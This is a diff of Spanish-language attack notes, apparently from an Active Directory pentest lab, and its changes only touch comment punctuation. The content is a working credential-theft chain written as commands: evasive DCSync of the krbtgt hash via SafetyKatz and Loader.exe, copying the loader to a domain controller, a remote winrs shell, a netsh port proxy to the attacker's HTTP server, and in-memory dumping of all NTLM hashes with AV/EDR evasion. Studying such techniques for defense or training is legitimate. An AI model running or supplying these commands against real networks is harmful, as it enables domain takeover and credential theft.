@@ -32,21 +32,21 @@ Tags: #AD #Windows #Rubeus #Powershell #SafetyKatz
 # Solicita un TGT para svcadmin usando su clave AES256 (más sigiloso que RC4/NTLM), crea un proceso cmd.exe en modo sacrificio (/createnetonly) para inyectar el ticket sin contaminar la sesión actual, y lo muestra — enfoque OPSEC-friendly para movimiento lateral.
 
 ❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
-# Carga SafetyKatz vía Loader.exe (evasión de disco) y ejecuta DCSync en su variante evasiva para obtener el hash NTLM/AES de krbtgt — combina evasión de AV/EDR con replicación de credenciales sin ejecutar código en el DC.
+# Carga SafetyKatz vía Loader.exe (evasión de disco) y ejecuta DCSync en su variante evasiva para obtener el hash NTLM/AES de krbtgt, combina evasión de AV/EDR con replicación de credenciales sin ejecutar código en el DC.
 ```
 
 ```powershell 
 ❯ echo F | xcopy C:\AD\Loader.exe \\dcorp-dc\C$\User\Public\Loader.exe /Y
-# Copia Loader.exe al DC vía SMB (admin share) sobreescribiendo si existe — requiere acceso de administrador al DC.
+# Copia Loader.exe al DC vía SMB (admin share) sobreescribiendo si existe, requiere acceso de administrador al DC.
 
 ❯ winrs -r:dcorp-dc cmd
-# Abre una shell remota en el DC vía WinRM usando las credenciales actuales — alternativa ligera a PSRemoting.
+# Abre una shell remota en el DC vía WinRM usando las credenciales actuales, alternativa ligera a PSRemoting.
 
 ❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP_WStudent
-# Crea un port forwarding en el DC: redirige tráfico del puerto 8080 local hacia el puerto 80 del atacante — permite que el DC alcance el servidor HTTP donde está SafetyKatz.
+# Crea un port forwarding en el DC: redirige tráfico del puerto 8080 local hacia el puerto 80 del atacante, permite que el DC alcance el servidor HTTP donde está SafetyKatz.
 
 ❯ .\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
-# Desde el DC, carga SafetyKatz en memoria vía el portforwarding y vuelca los hashes NTLM de todas las cuentas incluyendo krbtgt — evasión completa sin tocar disco.
+# Desde el DC, carga SafetyKatz en memoria vía el portforwarding y vuelca los hashes NTLM de todas las cuentas incluyendo krbtgt, evasión completa sin tocar disco.
 ```
 
 ```powershell 
